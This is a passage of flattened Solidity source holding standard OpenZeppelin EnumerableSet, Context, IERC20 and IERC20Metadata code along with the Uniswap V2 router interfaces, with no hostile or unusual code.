            uint256 lastIndex = set._values.length - 1;

            if (lastIndex != toDeleteIndex) {
                bytes32 lastValue = set._values[lastIndex];

                // Move the last value to the index where the value to delete is
                set._values[toDeleteIndex] = lastValue;
                // Update the index for the moved value
                set._indexes[lastValue] = valueIndex; // Replace lastValue's index to valueIndex
            }

            // Delete the slot where the moved value was stored
            set._values.pop();

            // Delete the index for the deleted slot
            delete set._indexes[value];

            return true;
        } else {
            return false;
        }
    }

    /**
     * @dev Returns true if the value is in the set. O(1).
     */
    function _contains(Set storage set, bytes32 value) private view returns (bool) {
        return set._indexes[value] != 0;
    }

    /**
     * @dev Returns the number of values on the set. O(1).
     */
    function _length(Set storage set) private view returns (uint256) {
        return set._values.length;
    }

    /**
     * @dev Returns the value stored at position `index` in the set. O(1).
     *
     * Note that there are no guarantees on the ordering of values inside the
     * array, and it may change when more values are added or removed.
     *
     * Requirements:
     *
     * - `index` must be strictly less than {length}.
     */
    function _at(Set storage set, uint256 index) private view returns (bytes32) {
        return set._values[index];
    }

    /**
     * @dev Return the entire set in an array
     *
     * WARNING: This operation will copy the entire storage to memory, which can be quite expensive. This is designed
     * to mostly be used by view accessors that are queried without any gas fees. Developers should keep in mind that
     * this function has an unbounded cost, and using it as part of a state-changing function may render the function
     * uncallable if the set grows to a point where copying to memory consumes too much gas to fit in a block.
     */
    function _values(Set storage set) private view returns (bytes32[] memory) {
        return set._values;
    }

    // Bytes32Set

    struct Bytes32Set {
        Set _inner;
    }

    /**
     * @dev Add a value to a set. O(1).
     *
     * Returns true if the value was added to the set, that is if it was not
     * already present.
     */
    function add(Bytes32Set storage set, bytes32 value) internal returns (bool) {
        return _add(set._inner, value);
    }

    /**
     * @dev Removes a value from a set. O(1).
     *
     * Returns true if the value was removed from the set, that is if it was
     * present.
     */
    function remove(Bytes32Set storage set, bytes32 value) internal returns (bool) {
        return _remove(set._inner, value);
    }

    /**
     * @dev Returns true if the value is in the set. O(1).
     */
    function contains(Bytes32Set storage set, bytes32 value) internal view returns (bool) {
        return _contains(set._inner, value);
    }

    /**
     * @dev Returns the number of values in the set. O(1).
     */
    function length(Bytes32Set storage set) internal view returns (uint256) {
        return _length(set._inner);
    }

    /**
     * @dev Returns the value stored at position `index` in the set. O(1).
     *
     * Note that there are no guarantees on the ordering of values inside the
     * array, and it may change when more values are added or removed.
     *
     * Requirements:
     *
     * - `index` must be strictly less than {length}.
     */
    function at(Bytes32Set storage set, uint256 index) internal view returns (bytes32) {
        return _at(set._inner, index);
    }

    /**
     * @dev Return the entire set in an array
     *
     * WARNING: This operation will copy the entire storage to memory, which can be quite expensive. This is designed
     * to mostly be used by view accessors that are queried without any gas fees. Developers should keep in mind that
     * this function has an unbounded cost, and using it as part of a state-changing function may render the function
     * uncallable if the set grows to a point where copying to memory consumes too much gas to fit in a block.
     */
    function values(Bytes32Set storage set) internal view returns (bytes32[] memory) {
        return _values(set._inner);
    }

    // AddressSet

    struct AddressSet {
        Set _inner;
    }

    /**
     * @dev Add a value to a set. O(1).
     *
     * Returns true if the value was added to the set, that is if it was not
     * already present.
     */
    function add(AddressSet storage set, address value) internal returns (bool) {
        return _add(set._inner, bytes32(uint256(uint160(value))));
    }

    /**
     * @dev Removes a value from a set. O(1).
     *
     * Returns true if the value was removed from the set, that is if it was
     * present.
     */
    function remove(AddressSet storage set, address value) internal returns (bool) {
        return _remove(set._inner, bytes32(uint256(uint160(value))));
    }

    /**
     * @dev Returns true if the value is in the set. O(1).
     */
    function contains(AddressSet storage set, address value) internal view returns (bool) {
        return _contains(set._inner, bytes32(uint256(uint160(value))));
    }

    /**
     * @dev Returns the number of values in the set. O(1).
     */
    function length(AddressSet storage set) internal view returns (uint256) {
        return _length(set._inner);
    }

    /**
     * @dev Returns the value stored at position `index` in the set. O(1).
     *
     * Note that there are no guarantees on the ordering of values inside the
     * array, and it may change when more values are added or removed.
     *
     * Requirements:
     *
     * - `index` must be strictly less than {length}.
     */
    function at(AddressSet storage set, uint256 index) internal view returns (address) {
        return address(uint160(uint256(_at(set._inner, index))));
    }

    /**
     * @dev Return the entire set in an array
     *
     * WARNING: This operation will copy the entire storage to memory, which can be quite expensive. This is designed
     * to mostly be used by view accessors that are queried without any gas fees. Developers should keep in mind that
     * this function has an unbounded cost, and using it as part of a state-changing function may render the function
     * uncallable if the set grows to a point where copying to memory consumes too much gas to fit in a block.
     */
    function values(AddressSet storage set) internal view returns (address[] memory) {
        bytes32[] memory store = _values(set._inner);
        address[] memory result;

        /// @solidity memory-safe-assembly
        assembly {
            result := store
        }

        return result;
    }

    // UintSet

    struct UintSet {
        Set _inner;
    }

    /**
     * @dev Add a value to a set. O(1).
     *
     * Returns true if the value was added to the set, that is if it was not
     * already present.
     */
    function add(UintSet storage set, uint256 value) internal returns (bool) {
        return _add(set._inner, bytes32(value));
    }

    /**
     * @dev Removes a value from a set. O(1).
     *
     * Returns true if the value was removed from the set, that is if it was
     * present.
     */
    function remove(UintSet storage set, uint256 value) internal returns (bool) {
        return _remove(set._inner, bytes32(value));
    }

    /**
     * @dev Returns true if the value is in the set. O(1).
     */
    function contains(UintSet storage set, uint256 value) internal view returns (bool) {
        return _contains(set._inner, bytes32(value));
    }

    /**
     * @dev Returns the number of values on the set. O(1).
     */
    function length(UintSet storage set) internal view returns (uint256) {
        return _length(set._inner);
    }

    /**
     * @dev Returns the value stored at position `index` in the set. O(1).
     *
     * Note that there are no guarantees on the ordering of values inside the
     * array, and it may change when more values are added or removed.
     *
     * Requirements:
     *
     * - `index` must be strictly less than {length}.
     */
    function at(UintSet storage set, uint256 index) internal view returns (uint256) {
        return uint256(_at(set._inner, index));
    }

    /**
     * @dev Return the entire set in an array
     *
     * WARNING: This operation will copy the entire storage to memory, which can be quite expensive. This is designed
     * to mostly be used by view accessors that are queried without any gas fees. Developers should keep in mind that
     * this function has an unbounded cost, and using it as part of a state-changing function may render the function
     * uncallable if the set grows to a point where copying to memory consumes too much gas to fit in a block.
     */
    function values(UintSet storage set) internal view returns (uint256[] memory) {
        bytes32[] memory store = _values(set._inner);
        uint256[] memory result;

        /// @solidity memory-safe-assembly
        assembly {
            result := store
        }

        return result;
    }
}

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts v4.4.1 (utils/Context.sol)

pragma solidity ^0.8.0;

/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts (last updated v4.6.0) (token/ERC20/IERC20.sol)

pragma solidity ^0.8.0;

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);

    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `to`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address to, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `from` to `to` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts v4.4.1 (token/ERC20/extensions/IERC20Metadata.sol)

pragma solidity ^0.8.0;

import "../IERC20.sol";

/**
 * @dev Interface for the optional metadata functions from the ERC20 standard.
 *
 * _Available since v4.1._
 */
interface IERC20Metadata is IERC20 {
    /**
     * @dev Returns the name of the token.
     */
    function name() external view returns (string memory);

    /**
     * @dev Returns the symbol of the token.
     */
    function symbol() external view returns (string memory);

    /**
     * @dev Returns the decimals places of the token.
     */
    function decimals() external view returns (uint8);
}

// SPDX-License-Identifier: MIT
pragma solidity >=0.6.2;

import './IUniswapV2Router01.sol';

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);

    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

// SPDX-License-Identifier: MIT
pragma solidity >=0.6.2;

interface IUniswapV2Router01 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);

    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);

    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);

    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);

    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);

    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);

    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
    external
    payable
    returns (uint[] memory amounts);

    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
    external
    returns (uint[] memory amounts);

    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
    external
    returns (uint[] memory amounts);

    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
    external
    payable
    returns (uint[] memory amounts);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);

    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);

    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);

    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);

    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}